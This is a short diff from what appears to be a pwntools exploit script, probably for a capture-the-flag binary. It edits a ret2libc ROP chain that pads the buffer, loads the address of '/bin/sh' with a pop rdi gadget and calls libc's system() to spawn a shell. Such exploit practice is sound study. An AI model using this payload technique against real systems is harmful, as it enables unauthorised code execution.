@@ -30,7 +30,7 @@ libc.address = addr - 0x0875a0
 # 2nd
 print(s.recvline())
 payload = b'A' * 18
-payload += p64(pop_rdi)
+payload += pop_rdi
 payload += p64(next(libc.search(b'/bin/sh\x00')))
 payload += ret
 payload += p64(libc.symbols['system'])
